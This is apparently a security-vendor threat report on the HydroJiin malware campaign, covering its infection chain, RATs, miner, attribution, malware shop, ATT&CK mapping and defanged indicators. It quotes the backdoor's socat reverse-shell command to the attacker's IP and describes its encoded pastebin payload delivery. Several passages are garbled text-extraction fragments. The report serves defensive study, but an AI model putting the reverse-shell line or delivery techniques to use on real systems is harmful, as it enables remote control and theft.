    "plain_text": "# A look at HydroJiin campaign\n\n**zscaler.com/blogs/security-research/look-hydrojiin-campaign**\n\nZscaler ThreatLabZ recently came across an interesting campaign involving multiple infostealer RAT families and miner malware. We’ve\ndubbed the campaign “HydroJiin” based on aliases used by the threat actor. The threat actor is in the business of selling malware, and lurks\naround in online forums that are common hangouts for neophyte to mid-level cyber criminals. We speculate that the malware author is\nrunning widespread campaigns involving different commodity and custom malware to steal information to sell in underground marketplaces.\n\n[Similar to other attacks outlined in the recent ThreatLabZ State of Encrypted Attacks report, this campaign serves as yet another example of](https://www.zscaler.com/blogs/security-research/2020-state-encrypted-attacks)\n[the importance of continuous SSL inspection and zero trust policies to prevent initial compromise as well as communication back to C&C](https://www.zscaler.com/resources/security-terms-glossary/what-is-zero-trust)\nservers. While we do not know the impact of this particular campaign, this type of malware is for sale on underground markets to any number\nof prospective cybercriminals. While not highly sophisticated, this campaign uses a number of different techniques in order to increase\nchances of successfully infiltrating organizations who do not take proper precautions.\n\nThis campaign utilizes a variety of payloads and infection vectors from commodity RATs to custom malware, email spam,\nbackdooring/masquerading as cracked software, and other lures. Listed below are some of the unique aspects of this campaign:\n\nMultilevel infection chain of payloads leading from one to the next\nCustom python-based backdoor deployed along with other RATs (Netwired and Quasar)\nPython backdoor command checking for MacOS indicating possibility of more cross-platform functionality in the future.\nCampaign is related to a threat actor who is also involved in distribution of multiple malicious tools via a dedicated malware e-commerce\nwebsite\n[Possibility of backdoored malware payload similar to CobianRAT case](https://www.zscaler.com/blogs/security-research/cobian-rat-backdoored-rat)\nNot rare, but heavy use of pastebin to host encoded payloads\n\n## Infection chain\n\n\n-----\n\n**_Figure 1: Infection Chain_**\n\nThe infection starts with the delivery of a downloader that downloads multiple payloads. We could not confirm the delivery vector of this\ndownloader but in we suspect the use of spam emails and cracked software as we have seen in earlier campaigns. Once the attackers\nachieve initial compromise, the downloader downloads three files:\n\nInjector - Used as a loader to inject downloaded payloads into legitimate processes.\nNetwired RAT - A commodity RAT malware used to control the infected system and steal information.\nDownloaderShellcode - Obfuscated Meterpreter-based shellcode to download further payloads.\n\nA Pyrome python backdoor is downloaded by this shellcode. This will also download socat and xmrig miner, and finally xmrig\nminer downloads another RAT named Quasar.\n\nEach payload and its functionality is explained below.\n\n### 1 Analysis of downloader payload\n\nFirst, the downloader downloads a payload from pastebin and saves to %TEMP% path, with randomly generated names. The payload\nhosted on pastebin is encoded in base64 with the text string reversed.\n\n\n-----\n\n**_Figure 2: Downloading encoded payload from pastebin_**\n\nThe downloaded malware is an injector. It downloads two more payloads and passes an argument to the first payload for injection.\n\n**_Figure 3: Passing payloads to injector_**\n\nPayloads are then downloaded from:\n\nxmr-services[.]com/C/ABAGFBBEBDBCDBFCAEGBEEBAAB_B__DFECBAGGDEBEFD_EDCCBAEFEE.txt - Shellcode Downloader\npastebin[.]com/raw/G0jcGs79 - NetwiredRC\n\nThe payloads are also similarly string reversed after base64 encoding.\n\n**1.1 NetWiredRC**\n\nThe second payload in this case, hosted on pastebin, is a commodity malware known as NetWiredRC. NetWiredRC is a publicly available\nRAT sold by World Wired Labs, active since at least 2012. Adversaries often use spam mails and phishing emails to distribute NetWiredRC.\nIn the wild, it has been seen that NetWireRC is also used by APT threat actors. Netwired’s main focus is to gain unauthorized control on the\nvictim machine, steal stored credentials, and perform keylogging activity. This malware has had multiple version updates with bug fixes and\nnew functionality. This sample will communicate with beltalus.ns1[.]name:8084 for further commands.\n\nConfiguration extracted from Netwire RAT::\n\n_{'Domains': ['beltalus.ns1[.]name:8084'], 'Proxy Server': 'Not Configured', 'Password': b'Volve', 'Host ID': b'Loader-%Rand%', 'Mutex':_\n_b'mKsWHTbK', 'Install Path': b'-', 'Startup Name': b'-', 'ActiveX Key': b'-', 'KeyLog Dir': b'%AppData%\\\\Logs_temp\\\\', 'Proxy Option': 'Direct_\n_connection', 'Copy executable': False, 'Delete original': False, 'Lock executable': False, 'Registry autorun': False, 'ActiveX autorun': False,_\n_'Use a mutex': True, 'Offline keylogger': True}_\n\n**1.2 Shellcode Downloader**\n\n[The first of the two downloaded payloads is a Metasploit Shikata Ga Nai Encoder encoded shellcode capable of downloading another](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html)\npayload from: r3clama[.]com/files/chrome.exe.\n\nPDB path embedded inside binary: C:\\local0\\asf\\release\\build-2.2.14\\support\\Release\\ab.pdb\n\nThe shellcode downloader downloads the following payloads:\n\n\n-----\n\n_3c a_ _a[ ]co_ _/ es/socat_ _p_ Socat too\n_r3clama[.]com/files/services.exe : Miner Dropper_\n\n**1.2.1 PyInstaller Payload**\n\nThe payload downloaded from r3clama[.]com is a Python-based malware bundled using pyinstaller. Capabilities of this payload include:\n\nPersistence using Run key.\nDownload, save and extract socat.zip from https://r3clama[.]com/files/socat.zip.\nDownload monero miner exe from https://r3clama[.]com/files/services.exe which runs and further downloads QuasarRAT.\nStart network communication thread.\n\n**_Figure 4 : Configuration settings of malware_**\n\n**Network Communication**\n\nThe malware next communicates with C&C server at IP '193.218.118[.]190' and port 8266, first by sending a key to the server and then\nwaiting for .json commands. Commands supported by this malware include:\n\nw0rm\nurl\nupload\n\n\n-----\n\n**_Figure 5 : Commands support by python backdoor_**\n\n**Command 'url' and 'upload'**\n\nBoth url and upload commands are supported only for Windows OS—on any other platform these commands are ignored. Each of these\ncommands is basically the same, and will download and save a payload from specified url. Files are saved under a newly created directory\nunder %temp% with 16-character random names. There are only two differences:\n\n1. In the case of upload, the downloaded file is saved at %temp%/upload and in case of url the file is saved at %temp%/userbin.\n2. The url command also executes the file in addition to downloading it while the upload command does not.\n\n**Command 'w0rm'**\n\nThe w0rm command is supported on two platforms - Windows and MacOS. On receipt of this command, socat runs with following command\nline:\n\n_\"socat OPENSSL:193[.]218[.]118[.]190:4442,verify=0 EXEC:{OS Command}\"_\n\n**OS** **Command**\n\nWindows : 'cmd.exe',pipes\n\nMacOS : /bin/bash\n\nAnd sends hostname+’$>’ back to C&C over socket.\n\nIn short, this command provides a reverse shell on the system to the attacker through socat.\n\n**1.2.1.1** **[Socat](http://www.dest-unreach.org/socat/)**\n\nSocat is an advanced multipurpose data relay tool. It supports a plethora of protocols. Below is the description from its creators:\n\n“socat is a relay for bidirectional data transfer between two independent data channels. Each of these data channels may be a file, pipe,\ndevice (serial line etc. or a pseudo terminal), a socket (UNIX, IP4, IP6 - raw, UDP, TCP), an SSL socket, proxy CONNECT connection, a file\ndescriptor (stdin etc.), the GNU line editor (readline), a program, or a combination of two of these. These modes include generation of\n[\"listening\" sockets, named pipes, and pseudo terminals.” - README](http://www.dest-unreach.org/socat/doc/README)\n\n**1.2.1.2 Miner Dropper**\n\nThis is again a .Net based malware. It includes a monero miner binary and all the dll dependencies required by a monero miner executable. It\nwill drop and run the miner payload. Then, it downloads and runs an additional payload, again from pastebin.\n\n\n-----\n\ne e s t e e oppe seque ce\n\nInstalls miner executable and dependency files.\n\n**_Figure 6: Installing xmrig miner dependency files_**\n\nWaits for idle before starting miner.\n\n**_Figure 7: Checks if system is Idle before starting miner_**\n\nCheckActive checks if the miner process is already running, if not then it is started by StartFiles.\n\n**_Figure 8: Running miner executable with required arguments._**\n\nDownloads Quasar RAT payload from (https://pastebin[.]com/raw/khzLqKyN) after starting miner:\n\n\n-----\n\n**_Figure 9: Downloading another payload(QuasarRAT)_**\n\nThis miner could be the MinerGate Silent Miner sold on the threat actor’s malware shop. If our assumption is true, there is another possibility\n[of that miner being backdoored, similar to an old case of Cobian RAT, piggybacking on client malware operators to distribute his own RATs.](https://www.zscaler.com/blogs/security-research/cobian-rat-backdoored-rat)\nUnfortunately, it is not possible to assert the assumption without access to the builder.\n\n**1.2.1.2.1 QuasarRAT**\n\nQuasarRAT has been active since at least 2015. Quasar is an open-source project written in .Net framework and freely available to the public.\nThis means anyone can take the code and use it freely, with or without modification. Hence, this malware has become quite popular among\ncyber criminals. It has been used in various campaigns from mass spam campaigns to targeted attacks. The sample used in this campaign\nwas version 1.3, which has been used in a number of past campaigns.\n\n**Configuration of QuasarRAT**\n\nVersion: \"1.3.0.0\"\n\nC&C : \"beltalus.ns1[.]name:8082;\"\n\nFilename: \"Client.exe\"\n\nMutex: \"QSR_MUTEX_NJPXiF1GKqO6Y3uwjn\"\n\nThe C&C address used to control the Python backdoor and socat reverse shell is historically known to host C&C servers for many other\nmalwares. Here is list of some malware and corresponding ports used to host C&C servers in the past:\n\n**IP** **Port** **Malware**\n\n193.218.118.190 8266 Python backdoor\n\n193.218.118.190 4442 Socat listener OPENSSL\n\n193.218.118.190 1111 NjRAT\n\n193.218.118.190 2407 QuasarRAT\n\n193.218.118.190 8050 Nanocore\n\n### Threat Actor HydroJiin\n\nWe believe this campaign is run by a threat actor known by the aliases ‘Hydro’ and ‘JiiN’. The threat actor is active on forums such as\nhackforums[.]net since 2010 and on YouTube at least since 2007. Initially the actor was involved with game mods and cracks, and\neventually moved into malware space. We, with high confidence, believe that this actor is from a French-speaking region.\n\nBy the other alias JiiN, the threat actor runs a malware shop called JiiN shop at “xmr-services[.]com”. Based on the two aliases, we are calling\nthis campaign and actor HydroJiin.\n\nWe are attributing this campaign to HydroJiin with high confidence due to following reasons:\n\n_JiiN h_ _(X_ i ) i d i thi i\n\n\n-----\n\n_J_ _s op(_ se ces) se s a a e too s c yd o a es deos about\nThis campaign downloads an encrypted payload from paste by user Hydro59.\n\nAll of the above indicates the relation between HydroJiin, this campaign, and xmr-services.\n\n### Malware Shop\n\nThe website called “JiiN shop” is based on the username of malware developer/seller and hosted at “xmr-services[.]com.” It is used to\nadvertise and sell different malware products. The threat actor is using https://shoppy[.]gg for handling cryptocurrency payments. He is also\nselling some additional stuff on shoppy.\n\n**_Figure 10: JiiN Shop_**\n\nMalware sold on this website includes:\n\n**Minergate silent miner - A configurable miner tool to mine multiple cryptocurrencies on CPU or GPU hidden from the user. Comes with**\na builder with options for obfuscation, persistence, etc.\n**Coak Crypter - As the name implies, a packer tool to obfuscate other malware to make them undetectable.**\n**NiiJ Stealer - A very basic stealer to steal passwords from popular tools like Firefox, Opera, Chrome, FileZilla, etc and send to the C&C**\npanel.\n**INK Exploit - Claims to make malware FUD, but provides no details about the specific exploit.**\n\n## The Campaign\n\nThe infection cycle and malware payloads discussed above are just a part of an ongoing campaign. The campaign has been going on since\nat leastSeptember 29th, 2020. The source website for this campaign is also serving other payloads which led us to more domains and\npayloads. Covering the whole campaign is out of scope for this blog post. But we are providing some details we have noticed. And a nonexhaustive list of malicious websites serving malwares, C&C domains is also included in the IoC section.\n\nMost of the domains as well as served file names follow a pattern. Domains are mostly registered using namecheap.\n\nDomain Pattern:\n\n[a-z]{4,8}\\d{2,4}[a-z]{0,2}.xyz\n\nE.g\n\npzazmrserv194[.]xyz\n\nmpzskdfadvert329[.]xyz\n\nhklkxadvert475[.]xyz\n\n\n-----\n\ng sta se e [ ] y\n\n**Filename pattern example** **Malware Family**\n\natx111.exe SmokeLoader\n\nsocks111.exe SystemBC\n\ntau111.exe Tauras Stealer\n\nlkx111 Roger Ransomware\n\nlb777 Lockbit ransomware\n\nvoid.exe Downloader\n\ndesk Anydesk\n\n## Conclusion\n\nThe threat actor HydroJiin has been in the malware business for some time now. He is selling multiple malware types along with running his\nown campaigns. The malware payload download stats from pastebin indicate he is having decent success. This actor might not be highly\nadvanced but he is persistent in his efforts by using various tools, techniques, and methods to increase his chances of success. SSL\ninspection is advisable to detect and block such threats using SSL to hide their malicious intent. We at ZScaler ThreatLabZ continue to\nmonitor, and strive to protect our customers from, all levels of threats.\n\n## Detection\n\n**_Figure 11: Zscaler Cloud sandbox report flagging malware_**\n\nIn addition to sandbox detections, the Zscaler Cloud Security Platform detects indicators at various levels:\n\n[Win32 Backdoor NetWiredRC](https://threatlibrary.zscaler.com/?keyword=Win32.Backdoor.NetWiredRC)\n\n\n-----\n\n3 o [oade](https://threatlibrary.zscaler.com/?keyword=Win32.Downloader.NetWiredRC) et ed C\n\n[Win32.Backdoor.QuasarRAT](https://threatlibrary.zscaler.com/?keyword=Win32.Backdoor.QuasarRAT)\n\n[Win32.Coinminer.Xmrig](https://threatlibrary.zscaler.com/?keyword=Win32.Coinminer.Xmrig)\n\n[Win32.Downloader.MiniInject](https://threatlibrary.zscaler.com/threats/52af34fd-bdb8-4653-a849-b2ee97251b88)\n\n[Win32.Downloader.Pyrome](https://threatlibrary.zscaler.com/threats/2ad61b60-29c1-4a10-b196-71ce43368553)\n\n### MITRE ATT&CK\n\n**ID** **Tactic** **Technique**\n\n\nT1059 Command and Scripting Interpreter: Windows\nCommand Shell\n\n\nExecute reverse shell commands\n\n\nT1555 Credentials from Password Stores Mentioned RAT functionality\n\nT1573 Encrypted Channel: Symmetric Cryptography Encrypt the communication between the victim and the remote machine\n\nT1105 Ingress Tool Transfer Downloads the Miner and RAT on the victim machine\n\nT1056 Input Capture: Keylogging Mentioned RAT functionality\n\nT1112 Modify Registry Modify Run entry in registry\n\nT1090 Proxy Quasar uses SOCKS5 to communicate over a reverse proxy\n\nT1021 Remote Services: Remote Desktop Protocol Quasar module to perform remote desktop access\n\nT1053 Scheduled Task/Job: Scheduled Task Establish persistence by creating new schtasks\n\nT1082 System Information Discovery Quasar and NETWIRE both RAT having this feature to discover and collect\nvictim machine information.\n\nT1125 Video Capture Mentioned RAT functionality\n\nT1113 Screen Capture Mentioned RAT functionality\n\nT1132 Data Encoding Downloaded Base64 encoded file\n\nT1496 Resource Hijacking Install XMRig Miner on victim machine\n\nT1027 Obfuscated Files or Information XOR operation is implemented to decrypt the file\n\n## IOCs\n\n**Filename** **Md5** **Malwar**\n\nVoid.exe [ parent file] 656951fa7b57355b58075b3c06232b01 Win32.\n\n\n-----\n\nABAGFBBEBDBCDBFCAEGBEEBAAB_B__DFECBAGGDEBEFD_EDCCBAEFEE.txt 9c50501b6f68921cafed8af6f6688fed Win32.\n\nchrome.exe 294fd63ebaae4d2e8c741003776488c2 Win32.\n\nService.exe e9bccc96597cc96d22b85010d7fa3004 Win32.\n\nkhzLqKyN 3bb3340bccdab8cde94dd1bf105e1d3e Win32.\n\nG0jcGs79 F094D8C0D9E6766BCCF78DA49AAB3CBC Win32.\n\n**URLs** **Malware**\n\ngzlkmcserv437[.]xyz/void.exe Win32.Downloader.MiniInject\n\nr3clama[.]com/files/socat.zip Socat tool\n\nr3clama[.]com/files/services.exe Win32.Coinminer.Xmrig\n\npastebin[.]com/raw/khzlqkyn Win32.Backdoor.QuasarRAT\n\npastebin[.]com/raw/G0jcGs79 Win32.Backdoor.NetWiredRC\n\n**C&C:**\n\n**C&C** **Malware**\n\nbeltalus.ns1[.]name:8084' NetWiredRC\n\n82.65.58[.]129 NetWiredRC\n\nxmr.pool.minergate[.]com XMRIG Miner\n\nbeltalus.ns1[.]name:8082 QuasarRAT\n\n193.218.118[.]190:8266 Pyrome backdoor\n\n193.218.118[.]190:4442 Socat\n\n193.218.118[.]190:8266 Python backdoor\n\n193.218.118[.]190:4442 Socat listener OPENSSL\n\n193.218.118[.]190:1111 NjRAT\n\n193.218.118[.]190:2407 QuasarRAT\n\n193.218.118[.]190:8050 Nanocore\n\n\n-----",
